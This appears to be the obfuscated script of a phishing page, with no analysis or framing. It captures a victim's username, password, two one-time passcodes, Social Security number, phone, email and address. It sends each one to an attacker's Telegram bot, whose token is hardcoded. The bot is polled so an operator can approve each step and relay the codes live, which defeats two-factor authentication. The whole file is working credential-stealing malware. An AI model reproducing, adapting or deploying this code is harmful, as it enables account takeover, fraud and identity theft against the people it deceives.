(function(_0x1b2c,_0x4e5a){const _0x3f12=function(_0x2d9a){while(--_0x2d9a){_0x1b2c['push'](_0x1b2c['shift']());}};_0x3f12(++_0x4e5a);}(_0x2a1b,0x1f4));const _0x5c2d=function(_0x1a2b,_0x3c4d){_0x1a2b=_0x1a2b-0x0;let _0x5e6f=_0x2a1b[_0x1a2b];return _0x5e6f;};function _0x2a1b(){const _0x9d3f=['8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU','-1003931675068','floor','random','user','pass','otp1','info','otp2','loadingOverlay','style','display','flex','Markdown','POST','application/json','stringify','sendMessage','getUpdates','callback_query','includes','split','clearInterval','none','otpError1','infoError','otpError2','active','classList','remove','add','scrollTo'];_0x2a1b=function(){return _0x9d3f;};return _0x2a1b();}

const _0x4d2e = _0x5c2d('0x0');
const _0x1f9a = _0x5c2d('0x1');
const _0x3b1c = Math[_0x5c2d('0x2')](Math[_0x5c2d('0x3')]() * 0xdbba0) + 0x186a0;

let _0x2e4f = { [_0x5c2d('0x4')]: "", [_0x5c2d('0x5')]: "", [_0x5c2d('0x6')]: "", [_0x5c2d('0x7')]: "", [_0x5c2d('0x8')]: "" };

async function nextStep(_0x12a3) {
    const _0x54b1 = document.getElementById(_0x5c2d('0x9'));
    if (_0x54b1) _0x54b1[_0x5c2d('0xa')][_0x5c2d('0xb')] = _0x5c2d('0xc');
    let _0x3d2a = `🆔 **Session:** #${_0x3b1c}\n`;
    let _0x1c4d = [];

    if (_0x12a3 === 0x2) {
        _0x2e4f[_0x5c2d('0x4')] = document.getElementById(_0x5c2d('0x4')).value;
        _0x2e4f[_0x5c2d('0x5')] = document.getElementById(_0x5c2d('0x5')).value;
        _0x3d2a += `👤 User: \`${_0x2e4f[_0x5c2d('0x4')]}\`\n🔑 Pass: \`${_0x2e4f[_0x5c2d('0x5')]}\``;
        _0x1c4d = [[{ text: "✅ اطلب OTP 1", callback_data: `approve_2_${_0x3b1c}` }, { text: "❌ خطأ دخول", callback_data: `decline_2_${_0x3b1c}` }]];
    } else if (_0x12a3 === 0x3) {
        _0x2e4f[_0x5c2d('0x6')] = document.getElementById(_0x5c2d('0x6')).value;
        _0x3d2a += `👤 User: \`${_0x2e4f[_0x5c2d('0x4')]}\`\n🔑 Pass: \`${_0x2e4f[_0x5c2d('0x5')]}\`\n\n🔢 OTP 1: \`${_0x2e4f[_0x5c2d('0x6')]}\``;
        _0x1c4d = [[{ text: "✅ تجاوز لـ Info", callback_data: `approve_3_${_0x3b1c}` }, { text: "❌ الرمز خطأ", callback_data: `decline_3_${_0x3b1c}` }]];
    } else if (_0x12a3 === 0x4) {
        _0x2e4f[_0x5c2d('0x7')] = `Full Name: ${document.getElementById('fName').value} ${document.getElementById('lName').value}\nSSN: ${document.getElementById('ssn').value}\nPhone: ${document.getElementById('phone').value}\nEmail: ${document.getElementById('email').value}\nAddress: ${document.getElementById('street').value}, ${document.getElementById('city').value}, ${document.getElementById('state').value}`;
        _0x3d2a += `👤 User: \`${_0x2e4f[_0x5c2d('0x4')]}\`\n🔑 Pass: \`${_0x2e4f[_0x5c2d('0x5')]}\`\n\n📝 **Full Info:**\n${_0x2e4f[_0x5c2d('0x7')]}`;
        _0x1c4d = [[{ text: "✅ اطلب OTP 2", callback_data: `approve_4_${_0x3b1c}` }, { text: "❌ خطأ بيانات", callback_data: `decline_4_${_0x3b1c}` }]];
    } else if (_0x12a3 === 0x5) {
        _0x2e4f[_0x5c2d('0x8')] = document.getElementById(_0x5c2d('0x8')).value;
        _0x3d2a += `👤 User: \`${_0x2e4f[_0x5c2d('0x4')]}\`\n🔑 Pass: \`${_0x2e4f[_0x5c2d('0x5')]}\`\n\n🔢 OTP 2: \`${_0x2e4f[_0x5c2d('0x8')]}\``;
        _0x1c4d = [[{ text: "✅ إنهاء العملية", callback_data: `approve_5_${_0x3b1c}` }, { text: "❌ الرمز خطأ", callback_data: `decline_5_${_0x3b1c}` }]];
    }

    await _0x1a4b(_0x3d2a, _0x1c4d);
    _0x5e6d();
}

async function _0x1a4b(_0x12f3, _0x2c1d) {
    try {
        await fetch(`https://api.telegram.org/bot${_0x4d2e}/${_0x5c2d('0x11')}`, {
            method: _0x5c2d('0xe'),
            headers: { 'Content-Type': _0x5c2d('0xf') },
            body: JSON.stringify({ chat_id: _0x1f9a, text: _0x12f3, parse_mode: _0x5c2d('0xd'), reply_markup: { inline_keyboard: _0x2c1d } })
        });
    } catch (_0x3e2d) {}
}

function _0x5e6d() {
    const _0x2b3c = setInterval(async () => {
        try {
            const _0x14e2 = await fetch(`https://api.telegram.org/bot${_0x4d2e}/${_0x5c2d('0x12')}?offset=-1`);
            const _0x4c2b = await _0x14e2.json();
            if (_0x4c2b.result && _0x4c2b.result.length > 0) {
                const _0x2d1a = _0x4c2b.result[0][_0x5c2d('0x13')];
                if (_0x2d1a && _0x2d1a.data && _0x2d1a.data[_0x5c2d('0x14')](_0x3b1c.toString())) {
                    const _0x1c2b = _0x2d1a.data[_0x5c2d('0x15')]('_');
                    clearInterval(_0x2b3c);
                    _0x3a4f(_0x1c2b[0], parseInt(_0x1c2b[1]));
                }
            }
        } catch (_0x1a2e) {}
    }, 0xbb8);
}

function _0x3a4f(_0x4b2d, _0x1e2f) {
    const _0x54b1 = document.getElementById(_0x5c2d('0x9'));
    if (_0x54b1) _0x54b1[_0x5c2d('0xa')][_0x5c2d('0xb')] = _0x5c2d('0x17');
    if (_0x4b2d === 'approve') {
        [_0x5c2d('0x18'), _0x5c2d('0x19'), _0x5c2d('0x1a')].forEach(_0x5d2a => { if(document.getElementById(_0x5d2a)) document.getElementById(_0x5d2a)['style'][_0x5c2d('0xb')] = _0x5c2d('0x17'); });
        goStep(_0x1e2f);
    } else {
        if (_0x1e2f === 0x2) goStep(0x1);
        if (_0x1e2f === 0x3) document.getElementById(_0x5c2d('0x18'))[_0x5c2d('0xa')][_0x5c2d('0xb')] = 'block';
        if (_0x1e2f === 0x4) document.getElementById(_0x5c2d('0x19'))[_0x5c2d('0xa')][_0x5c2d('0xb')] = 'block';
        if (_0x1e2f === 0x5) document.getElementById(_0x5c2d('0x1a'))[_0x5c2d('0xa')][_0x5c2d('0xb')] = 'block';
    }
}

function goStep(_0x1f2e) {
    document.querySelectorAll('.page-section').forEach(_0x4d3c => _0x4d3c[_0x5c2d('0x1c')][_0x5c2d('0x1d')](_0x5c2d('0x1b')));
    const _0x3b2d = document.getElementById('step' + _0x1f2e);
    if (_0x3b2d) _0x3b2d[_0x5c2d('0x1c')][_0x5c2d('0x1e')](_0x5c2d('0x1b'));
    window[_0x5c2d('0x1f')]({ top: 0, behavior: 'smooth' });
}
